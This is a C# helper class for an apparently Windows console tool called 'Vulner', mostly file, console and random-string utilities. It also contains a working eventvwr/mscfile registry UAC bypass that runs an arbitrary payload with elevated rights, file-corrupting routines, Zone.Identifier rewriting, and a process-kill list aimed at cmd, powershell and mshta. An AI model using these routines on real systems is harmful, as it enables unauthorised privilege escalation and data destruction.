using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Threading;
using System.Management;
using System.Globalization;
using System.Runtime.InteropServices;
using System.Drawing;
using Microsoft.Win32.SafeHandles;
using System.Net;
using System.Net.Sockets;

namespace Vulner
{
    class Funcs
    {
        static public string MakeWord( int min = 1, int max = 4 )
        {
            string[] Ignore = new string[] { "con", "prn", "aux", "nul" };
            if (min > max || min < 0) { return ""; } 
            string c = "bcdfgjklmnpqrstvw"; //consonants
            string v = "aeiou"; // vowels
            string[] t = new string[] {
                "sp", "ck", "lf", "lk", "lp", "mp", "lt", "nd", "ng", "nk", "nt", "sh", "sk", "pt", "ch", "st", "ng", "er", "tch", "ll", "l", "t", "s"
            }; // endings
            string r = "";
            for (int i = 0; i < Funcs.Rnd(min, max); i++)
            {
                r += string.Format("{0}{1}", PickRnd(c), PickRnd(v));
            }
            if ( r.Length == 2 || Rnd(0, 100) < 50 )
            {
                r += PickRnd(t);
            }
            if (Ignore.Contains(r)) return MakeWord(min, max);
            return r;
        }
        static public char PickRnd( string s )
        {
            return s[Funcs.Rnd(0, s.Length)];
        }
        static public T PickRnd<T>(T[] s)
        {
            return s[Funcs.Rnd(0, s.Length)];
        }
        static public string Signature(string Host, string Client)
        {
            string s = string.Format("{0}-{1}/{2}", Host, Client, "VULNER");
            return CalculateSHA1(s, Encoding.Unicode);
        }
        static public IPAddress LanIP()
        {
            return Dns.GetHostEntry(Dns.GetHostName()).AddressList.Where(o => o.AddressFamily == AddressFamily.InterNetwork).First();
        }

        public static string CalculateSHA1(string text, Encoding enc)
        {
            try
            {
                byte[] buffer = enc.GetBytes(text);
                System.Security.Cryptography.SHA1CryptoServiceProvider cryptoTransformSHA1 = new System.Security.Cryptography.SHA1CryptoServiceProvider();
                string hash = BitConverter.ToString(cryptoTransformSHA1.ComputeHash(buffer)).Replace("-", "");
                return hash;
            }
            catch (Exception x)
            {
                throw new Exception(x.Message);
            }
        }

        [DllImport("user32.dll")]
        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);

        static public void VolumeUp()
        {
            keybd_event((byte)Keys.VolumeUp, 0, 0, 0);
        }
        static public void VolumeDown()
        {
            keybd_event((byte)Keys.VolumeDown, 0, 0, 0);
        }
        static public void VolumeFull()
        {
            for (int i = 0; i < 500; i++) VolumeUp();
        }
        static public void VolumeMute()
        {
            for (int i = 0; i < 500; i++) VolumeDown();
        }

        [DllImport("kernel32.dll")]
        public static extern int GetCurrentThreadId();

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public static void HideConsole() { ShowWindow(GetConsoleWindow(), SW_HIDE); }
        public static void ShowConsole() { ShowWindow(GetConsoleWindow(), SW_SHOW); }

        public static Regex RegexFromStr(string s)
        {
            return new Regex("^" + Regex.Escape(s).Replace(@"\*", ".*").Replace(@"\?", ".") + "$", RegexOptions.IgnoreCase);
        }
        public static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }
        public static String BytesToString(long byteCount)
        {
            string[] suf = { "B", "KB", "MB", "GB", "TB", "PB", "EB" };
            if (byteCount == 0)
                return "0" + suf[0];
            long bytes = Math.Abs(byteCount);
            int place = Convert.ToInt32(Math.Floor(Math.Log(bytes, 1024)));
            double num = Math.Round(bytes / Math.Pow(1024, place), 1);
            return (Math.Sign(byteCount) * num).ToString() + " " + suf[place];
        }
        public static T Conv<T>(object input)
        {
            return (T)Convert.ChangeType(input, typeof(T));
        }
        public static bool MatchHost(string s)
        {
            if (new Regex(@"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\ [.]+$", RegexOptions.IgnoreCase).Match(s).Success) return true;
            if (new Regex(@"^::1\ [.]+$", RegexOptions.IgnoreCase).Match(s).Success) return true;
            return false;
        }
        public static string FindFile(string name)
        {
            string file = "";
            try
            {
                foreach (string str in Environment.GetEnvironmentVariable("path").Split(';').Concat(new string[] { Environment.CurrentDirectory }))
                {
                    if (new FileInfo(Path.Combine(str, name)).Exists)
                    {
                        file = new FileInfo(Path.Combine(str, name)).FullName;
                    }
                    try
                    {
                        foreach (string s in Directory.GetFiles(str))
                        {
                            string st = new FileInfo(s).Name;
                            if (new Regex("^" + Regex.Escape(name) + "\\.[^\\.]+").IsMatch(st))
                            {
                                file = new FileInfo(s).FullName;
                            }
                        }
                    }
                    catch (IOException) { }
                }
            }
            catch (Exception) { }
            return file;
        }
        public static string[] FindFiles(string name)
        {
            Dictionary<string, bool> file = new Dictionary<string, bool>();
            try
            {
                foreach (string str in Environment.GetEnvironmentVariable("path").Split(';').Concat(new string[] { Environment.CurrentDirectory }))
                {
                    try
                    {
                        if (new FileInfo(Path.Combine(str, name)).Exists)
                        {
                            file[new FileInfo(Path.Combine(str, name)).FullName] = true;
                        }
                    } catch (ArgumentException) { }
                    try
                    {
                        foreach (string s in Directory.GetFiles(str))
                        {
                            string st = new FileInfo(s).Name;
                            if (new Regex("^" + Regex.Escape(name) + "\\.[^\\.]+").IsMatch(st))
                            {
                                file[new FileInfo(s).FullName] = true;
                            }
                        }
                        foreach (string s in Directory.GetFiles(str))
                        {
                            string st = new FileInfo(s).Name;
                            string reg = "^" + Regex.Escape(name).Replace(@"\*", ".+").Replace(@"\?", ".") + "$";
                            if (new Regex(reg).IsMatch(st))
                            {
                                file[new FileInfo(s).FullName] = true;
                            }
                        }
                    }
                    catch (IOException) { }
                }
            }
            catch (Exception) { }
            return file.Select(t => t.Key).ToArray();
        }
        public static string RandomName(int len)
        {
            string a = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ.";
            byte[] bts = new byte[len];
            RandomNumberGenerator.Create().GetBytes(bts);
            return new String(bts.Select(t => a[t % a.Length]).ToArray());
        }

        public static string RandomString(int len)
        {
            string a = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvxwyz";
            byte[] bts = new byte[len];
            RandomNumberGenerator.Create().GetBytes(bts);
            return new String(bts.Select(t => a[t % a.Length]).ToArray());
        }
        public static string RandomString(int min, int max)
        {
            string a = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvxwyz";
            byte[] bts = new byte[Rnd(min, max)];
            RandomNumberGenerator.Create().GetBytes(bts);
            return new String(bts.Select(t => a[t % a.Length]).ToArray());
        }
        public static string RandomString(string a, int len)
        {
            byte[] bts = new byte[len];
            RandomNumberGenerator.Create().GetBytes(bts);
            return new String(bts.Select(t => a[t % a.Length]).ToArray());
        }
        public static string RandomString(string a, int min, int max)
        {
            byte[] bts = new byte[Rnd(min, max)];
            RandomNumberGenerator.Create().GetBytes(bts);
            return new String(bts.Select(t => a[t % a.Length]).ToArray());
        }

        public static string SizeToStr( double len )
        {
            string[] sizes = { "B", "KB", "MB", "GB", "TB", "PB" };
            int order = 0;
            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len = len / 1024;
            }
            
            return String.Format("{0:0.##} {1}", len, sizes[order]);
        }
        public static FileInfo TempFile()
        {
            string p = Path.Combine(Environment.GetEnvironmentVariable("temp"), RandomString(8, 12) + ".tmp");
            return new FileInfo(p);
        }
        public static string GetRelativePath(string filespec, string folder)
        {
            Uri pathUri = new Uri(filespec);
            // Folders must end in a slash
            if (!folder.EndsWith(Path.DirectorySeparatorChar.ToString()))
            {
                folder += Path.DirectorySeparatorChar;
            }
            Uri folderUri = new Uri(folder);
            return Uri.UnescapeDataString(folderUri.MakeRelativeUri(pathUri).ToString().Replace('/', Path.DirectorySeparatorChar));
        }

        public static byte[] RandomBytes(int min, int max)
        {
            byte[] bts = new byte[Rnd(min, max)];
            RandomNumberGenerator.Create().GetBytes(bts);
            return bts;
        }
        public static byte[] RandomBytesL(long min, long max)
        {
            byte[] bts = new byte[RndL(min, max)];
            RandomNumberGenerator.Create().GetBytes(bts);
            return bts;
        }
        public static byte[] RandomBytes(long c)
        {
            byte[] bts = new byte[c];
            RandomNumberGenerator.Create().GetBytes(bts);
            return bts;
        }
        public static int Rnd(int min = 0, int max = 100000)
        {
            byte[] bt = new byte[32];
            RandomNumberGenerator.Create().GetBytes(bt);
            int a = Math.Abs(BitConverter.ToInt32(bt, 0));
            return a % (max - min) + min;
        }
        public static long RndL(long min = 0, long max = 100000)
        {
            byte[] bt = new byte[500];
            RandomNumberGenerator.Create().GetBytes(bt);
            long a = Math.Abs(BitConverter.ToInt64(bt, 0));
            return a % (max - min) + min;
        }
        public static FileInfo ProcessFile(Process p)
        {
            try
            {
                return new FileInfo(p.MainModule.FileName);
            } catch (System.ComponentModel.Win32Exception)
            {
                return null;
            }
        }
        public static bool HasAttrib(FileAttributes a, FileAttributes b)
        {
            return ((int)a & (int)b) == (int)b;
        }
        public static string SpecialReadLine()
        {
            int xp = Console.CursorLeft;
            int yp = Console.CursorTop;
            Action S = () => { Console.SetCursorPosition(xp, yp); };
            Func<char, int, int> ins = (char ch, int p) =>
              {

                  return 0;
              };
            Console.TreatControlCAsInput = true;

            string s = "";
            while (!s.EndsWith("\n"))
            {
                Console.CursorSize = 1;
                Console.ReadLine();
                ConsoleKeyInfo k = Console.ReadKey(true);
                S();
                Console.WriteLine(new string(Enumerable.Repeat(' ', s.Length).ToArray()));
                if ((int)k.KeyChar == 22)
                {
                    s = s + System.Windows.Forms.Clipboard.GetText();
                }
                else if ((int)k.KeyChar == 3)
                {
                    Console.WriteLine();
                    return s = "\n";
                }
                else if ((int)k.KeyChar == 8)
                {
                    s = s.Substring(0, Math.Max(0, s.Length - 1));
                }
                else
                {
                    s = s + (int)k.KeyChar;
                }
                S();
                Console.Write(s);
            }
            return s;
        }
        public static void MagicNumber()
        {
            Dictionary<string, byte[]> MN = new Dictionary<string, byte[]>();
            MN["exe"] = new byte[] { 0x4D, 0x5A };
            MN["zip"] = new byte[] { 0x50, 0x4B };
        }
        public static Func<string, int> Corrupt(string method)
        {
            Dictionary<string, Func<string, int>> C = new Dictionary<string, Func<string, int>>();
            C["b"] = (string str) =>
            {
                FileStream f = new FileStream(str, FileMode.OpenOrCreate);
                try
                {
                    int l = (int)(Math.Min(f.Length, int.MaxValue));
                    for (int i = 0; i < 30; i++)
                    {
                        int pos = Rnd(0, l);
                        byte[] b = RandomString(Math.Min(200, l - pos)).Select(t => (byte)t).ToArray();
                        f.Position = pos;
                        f.Write(b, 0, b.Length);
                    }
                    f.Close();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    f.Close();
                    return -1;
                }
                return 0;
            };
            C["s"] = (string str) =>
            {
                FileStream f = new FileStream(str, FileMode.OpenOrCreate);
                try
                {
                    int l = (int)(Math.Min(f.Length, int.MaxValue));
                    double[] poss = new double[] { 0.00, 0.50, 0.9 };
                    for (int i = 0; i < poss.Length; i++)
                    {
                        int pos = (int)((double)l * poss[i]);
                        byte[] b = RandomString(Math.Min(300, l - pos)).Select(t => (byte)t).ToArray();
                        f.Position = pos;
                        f.Write(b, 0, b.Length);
                    }
                    f.Close();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    f.Close();
                    return -1;
                }
                return 0;
            };
            C["f"] = (string str) =>
            {
                FileStream f = new FileStream(str, FileMode.OpenOrCreate);
                try
                {
                    int l = (int)(Math.Min(f.Length, int.MaxValue));
                    bool done = false;
                    int i = 0;
                    int c = 1000;
                    while (!done)
                    {
                        if (i > l) { done = true; break; }
                        byte[] b = RandomString(Math.Min(c, l - i)).Select(t => (byte)t).ToArray();
                        f.Position = i;
                        f.Write(b, 0, b.Length);
                        i += c;
                    }
                    f.Close();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    f.Close();
                    return -1;
                }
                return 0;
            };
            try
            {
                return C[method];
            } catch (Exception) { }
            return null;
        }
        public static string[] GetFilesSmarty(string Input, bool Re, bool Recursive = false, string P = "")
        {
            try
            {
                Regex R = Re ? new Regex(Input) : new Regex("^" + Regex.Escape(Input).Replace(@"\*", ".*").Replace(@"\?", ".") + "$", RegexOptions.IgnoreCase);
                if (P == "") { P = Environment.CurrentDirectory; }
                string[] Files = Directory.GetFiles(P);
                string[] F = Equals(Files, null) ? Directory.GetFiles(Environment.CurrentDirectory) : Files;
                string[] s = F.Where(t => R.IsMatch(new FileInfo(t).Name)).ToArray();
                if (Recursive)
                {
                    foreach (string pt in Directory.GetDirectories(P))
                    {
                        DirectoryInfo di = new DirectoryInfo(pt);
                        s = s.Concat(GetFilesSmarty(Input, Re, true, di.FullName)).ToArray();
                    }
                }
                return s;
            } catch (Exception) { }
            return new string[] { };
        }
        public static string[] GetDirsSmarty(string Input, bool Re, bool Recursive = false, string P = "")
        {
            try
            {
                Regex R = Re ? new Regex(Input) : new Regex("^" + Regex.Escape(Input).Replace(@"\*", ".*").Replace(@"\?", ".") + "$", RegexOptions.IgnoreCase);
                if (P == "") { P = Environment.CurrentDirectory; }
                string[] Files = Directory.GetDirectories(P);
                string[] F = Equals(Files, null) ? Directory.GetDirectories(Environment.CurrentDirectory) : Files;
                string[] s = F.Where(t => R.IsMatch(new DirectoryInfo(t).Name)).ToArray();
                if (Recursive)
                {
                    foreach (string pt in Directory.GetDirectories(P))
                    {
                        DirectoryInfo di = new DirectoryInfo(pt);
                        s = s.Concat(GetDirsSmarty(Input, Re, true, di.FullName)).ToArray();
                    }
                }
                return s;
            }
            catch (Exception) { }
            return new string[] { };
        }
        public static void MakeKeyTree(string s, RegistryKey r = null)
        {
            RegistryKey rk = Registry.CurrentUser;
            if (!Equals(r, null)) rk = r;
            string v = "";
            foreach (string st in s.Split('\\'))
            {
                v += st;
                try
                {
                    rk.OpenSubKey(v).GetValue(null);
                }
                catch (Exception)
                {
                    rk.CreateSubKey(v);
                }
                v += '\\';
            }
        }
        public static void Exploit(string Payload)
        {
            string k = "Software\\Classes\\mscfile\\shell\\open\\command";
            MakeKeyTree(k);
            Registry.CurrentUser.OpenSubKey(k, true).SetValue("", string.Format("{0}", Payload));
            Process.Start("eventvwr.exe").WaitForExit();
            Registry.CurrentUser.DeleteSubKey(k);
        }
        public static bool CheckExploit()
        {
            try
            {
                int c = Process.GetProcessesByName("tracert").Count();
                string k = "Software\\Classes\\mscfile\\shell\\open\\command";
                MakeKeyTree(k);
                Registry.CurrentUser.OpenSubKey(k, true).SetValue("", string.Format("{0}", "tracert.exe 8.8.8.8"));
                Process.Start("eventvwr.exe").WaitForExit();
                Registry.CurrentUser.DeleteSubKey(k);
                Process p;
                if (!Equals(p = Process.GetProcessesByName("tracert")[c], null))
                {
                    p.Kill();
                    return true;
                }
            } catch (Exception) {
                try
                {
                    Process.GetProcessesByName("mmc").Each(t => { t.Kill(); });
                } catch(Exception) { }
            }
            return false;
        }
        public static string GetFile(string s)
        {
            string[] dirs = new string[]
            {
                "",
                Environment.CurrentDirectory
            };
            foreach (string dir in dirs)
            {
                FileInfo f = new FileInfo(Path.Combine(dir, s));
                if (f.Exists)
                {
                    return f.FullName;
                }
            }
            return "";
        }
        public static void Help(TerminalController Console, Command c, string s, string[] u, Dictionary<string, string> switches = null, Dictionary<string, string> param = null)
        {
            Console.ColorWrite("$a{1}", c.Name.ToUpper(), s);
            Console.ColorWrite("$8Usage:");
            foreach (string a in u) {
                Console.ColorWrite("$7" + a.Replace("{NAME}", c.Name)); // Keeps colors
            }

            if (!Equals(switches, null) && switches.Count > 0)
            {
                Console.ColorWrite("\n$8Switches:");
                foreach (KeyValuePair<string, string> a in switches)
                {
                    Console.ColorWrite(" $a/{0} $7- {1}", a.Key, a.Value.Replace("{NAME}", c.Name));
                }
            }

            if (!Equals(param, null) && param.Count > 0)
            {
                Console.ColorWrite("\n$8Switches:");
                foreach (KeyValuePair<string, string> a in param)
                {
                    Console.ColorWrite(" $a-{0} [value] $7- {1}", a.Key, a.Value.Replace("{NAME}", c.Name));
                }
            }
        }
        public static void RegexRename(string In, string Out, TerminalController Console, bool Copy = false)
        {
            string Reg = Regex.Escape(In).Replace(@"\*", "(.+)");

            int u = 0;
            Dictionary<string, string> Fr = new Dictionary<string, string>();
            foreach(string s in Directory.GetFiles(Environment.CurrentDirectory))
            {
                FileInfo f = new FileInfo(s);
                Match r = Regex.Match(f.Name, Reg);
                if (r.Success)
                {
                    if (Copy)
                    {
                        Fr[f.FullName] = f.FullName;
                    } else { 
                        Fr[f.FullName] = Path.Combine(f.Directory.FullName, u.ToString("X8") + RandomString(40, 50) + "." + RandomString(3));
                        File.Move(f.FullName, Fr[f.FullName]);
                    }
                    u++;
                }
            }
            int kv = 0;
            foreach (KeyValuePair<string, string> s in Fr)
            {
                FileInfo f = new FileInfo(s.Key);
                Match r = Regex.Match(f.Name, Reg);
                string res = "";
                string[] v = new string[r.Groups.Count];
                int i = 0;

                foreach (Group b in r.Groups)
                {
                    v[i++] = b.Value;
                }
                res = Out;
                try
                {
                    for (int k = 0; k < v.Length; k++)
                    {
                        res = res.Replace("$" + k, v[k]);
                    }
                    res = res.Replace("$i", kv.ToString());
                    if (Copy)
                    {
                        File.Copy(s.Value, new FileInfo(res).FullName);
                    }
                    else
                    {
                        File.Move(s.Value, new FileInfo(res).FullName);
                    }
                    Console.ColorWrite("$a{0} $c=> $f{1}", f.Name, res);
                }
                catch (Exception ex)
                {
                    Console.ColorWrite("$c{0} $c=> $f{1} $c- Error: {2}", f.Name, res, ex.Message);
                }
                kv++;
            }
        }
        public static string GetCommandline(Process p)
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(string.Format("SELECT * FROM Win32_Process"));
            foreach (ManagementObject m in searcher.Get())
            {
                if (int.Parse(m["handle"].ToString()) == p.Id)
                    return m["commandLine"].ToString();
            }
            return "";
        }
        public static bool RunFile(string f, Main m)
        {
            string filename = "";
            string contents = "";
            try
            {
                filename = GetFile(f);
                contents = File.ReadAllText(filename);
                Run(contents, m);
            } catch (Exception)
            {
                return false;
            }

            return Run(contents, m);
        }
        public static bool Run(string content, Main m)
        {
            bool header = true;
            bool stop = false;
            bool close = true;
            bool hidden = false;
            string dump = "";

            Dictionary<string, Func<string, int>> properties = new Dictionary<string, Func<string, int>>()
            {
                { "window", (s) =>
                {
                    if(s.ToLower().Trim() == "hidden")
                    {
                        hidden = true;
                    } else
                    {
                        hidden = false;
                    }
                    return 1;
                } },
                { "dump", (s) =>
                {
                    dump = s.ToLower();
                    return 1;
                } },
                { "close", (s) =>
                {
                    close = bool.Parse(s);
                    return 1;
                } },
            };

            try
            {
                foreach (string s in content.Split('\n'))
                {
                    if (stop) { break; }
                    string str = s.Trim();
                    if (Regex.Match(str, @"^[\s]*$").Success) { continue; }
                    if (str.StartsWith("@") && header)
                    {
                        string att = str.Split(' ')[0].Substring(1).ToLower();
                        string val = str.Substring(att.Length + 1);
                        if (properties.ContainsKey(att))
                        {
                            properties[att].Invoke(val);
                            if (stop) { break; }
                        }
                        continue;
                    }
                    else if (header)
                    {
                        header = false;
                        if (hidden)
                        {
                            Funcs.HideConsole();
                        } else
                        {
                            Funcs.ShowConsole();
                        }
                    }
                    m.RunCommand(str);
                }
            } catch (Exception)
            {
            }
            if (dump != "") try { File.WriteAllText(dump, m.t.EndBuffer()); } catch (Exception) { }
            if (close) Process.GetCurrentProcess().Kill();
            return true;
        }
        public static char[] InvisibleChars()
        {
            List<char> e = new List<char>();
            UnicodeCategory[] uc = new UnicodeCategory[]
            {
                UnicodeCategory.Format,
            };
            char b = '\0';
            for (int i = 1; i < 0xFFFF; i++)
            {
                b = (char)i;
                if (uc.Contains(CharUnicodeInfo.GetUnicodeCategory(b)))
                {
                    e.Add(b);
                }
            }
            return e.ToArray();
        }


        [DllImport("kernel32.dll")]
        static extern bool SetConsoleMode(IntPtr hConsoleHandle, int dwMode);

        const int ENABLE_QUICK_EDIT_MODE = 0x0010;

        public static void EnableRightClick()
        {
            SetConsoleMode(GetConsoleWindow(), ENABLE_QUICK_EDIT_MODE);
        }

        [DllImport("kernel32.dll")]
        static extern bool GetConsoleMode(IntPtr hConsoleHandle, out int lpMode);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool GetWindowRect(IntPtr hwnd, out Rectangle lpRect);

        public static Rectangle Attach()
        {
            Rectangle r = new Rectangle();
            GetWindowRect(GetConsoleWindow(), out r);
            return r;
        }

        public static T ToType<T>(object o)
        {
            return (T)Convert.ChangeType(o, typeof(T));
        }

        public static void ChangeDir(string P)
        {
            if (P == string.Empty) return;
            if (P.Length < 2) { Environment.CurrentDirectory = P; return; } // Stopping the error before it occurs
            Environment.CurrentDirectory = DriveLetterToUpper(P);
        }
        public static string DriveLetterToUpper(string P)
        {
            return P.Substring(0, 1).ToUpper() + P.Substring(1);
        }

        [DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern SafeFileHandle CreateFile(
        string name, FileAccess access, FileShare share,
        IntPtr security,
        FileMode mode, FileAttributes flags,
        IntPtr template);

        public static FileInfo Fi(string s)
        {
            return new FileInfo(Path.Combine(Environment.CurrentDirectory, s));
        }
        public static bool SetZone(FileInfo f, int zone)
        {
            try
            {
                using (SafeFileHandle handle = Funcs.CreateFile(f.FullName + @":Zone.Identifier", FileAccess.ReadWrite, FileShare.None, IntPtr.Zero, FileMode.OpenOrCreate, FileAttributes.Normal, IntPtr.Zero))
                {
                    // Here add test of CreateFile return code
                    // Then :

                    using (StreamWriter writer = new StreamWriter(new FileStream(handle, FileAccess.ReadWrite), Encoding.ASCII))
                    {
                        writer.WriteLine("[ZoneTransfer]");
                        writer.WriteLine("ZoneId={0}", zone);
                    }
                }
                return true;
            } catch(Exception) { }
            return false;
        }

        public static void Emergency( TerminalController t, Main m, bool restart = false )
        {
            if (!restart)
            Console.Beep(400, 500);
            if (!IsAdmin())
            {
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = m.FileName,
                        Arguments = string.Format("emergency"),
                        Verb = "runas",
                    });
                    Environment.Exit(0);
                    return;
                }
                catch (Exception) { }
                t.ColorWrite("$eTrying to run without administrator rights..."); 
            }
            t.ColorWrite("$cDropping connection...");
            Process.Start(new ProcessStartInfo { FileName = "ipconfig", Arguments = "/flushdns" }).WaitForExit();
            Process.Start(new ProcessStartInfo { FileName = "ipconfig", Arguments = "/release" }).WaitForExit();
            Process[] pr = Process.GetProcesses();
            t.ColorWrite("$cScanning memory...");
            HashSet<Process> tk = new HashSet<Process>();
            string AppData = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "..")).FullName;
            t.SetForeColor('f');
            Process self = Process.GetCurrentProcess();
            Regex[] rg = new Regex[]
            {
                new Regex(@"^.script$"),
                new Regex(@"^cmd$"),
                new Regex(@"^powershell$"),
                new Regex(@"^mshta$")
            };
            foreach ( Process p in pr )
            {
                if (p == self) continue;
                try
                {
                    FileVersionInfo fv = p.MainModule.FileVersionInfo;
                    FileInfo f = new FileInfo(fv.FileName);
                    DirectoryInfo d = f.Directory;
                    if (fv.FileName.StartsWith("c:\\windows\\", StringComparison.CurrentCultureIgnoreCase))
                    {
                        if (fv.CompanyName != "Microsoft Corporation")
                        {
                            tk.Add(p);
                            continue;
                        }
                    }
                    if (fv.FileName.StartsWith( AppData, StringComparison.CurrentCultureIgnoreCase) )
                    {
                        tk.Add(p);
                        continue;
                    }
                    if ((f.Attributes & FileAttributes.Hidden) != 0 ||
                        (d.Attributes & FileAttributes.Hidden) != 0)
                    {
                        tk.Add(p);
                        continue;
                    }
                }
                catch (Exception) { }
                foreach( Regex r in rg )
                {
                    if (r.IsMatch(p.ProcessName))
                    {
                        tk.Add(p);
                        continue;
                    }
                }
            }
            t.ColorWrite("$cKilling processes...");
            foreach( Process p in tk )
            {
                try
                {
                    p.Kill();
                    t.ColorWrite("$e {0}", p.ProcessName);
                } catch(Exception)
                {
                    t.ColorWrite("$c {0}", p.ProcessName);
                }
            }
            t.ColorWrite("$cFixing common problems...");
            m.RunCommand("rule cmd=1 regedit=1 taskmgr=1 run=1", false, true);
            m.RunCommand("rule cmd=1 regedit=1 taskmgr=1 run=1 /s", false, true);
            m.RunCommand("start taskmgr", false, true);
            m.RunCommand("netfix", false, true);
        }
    }
}
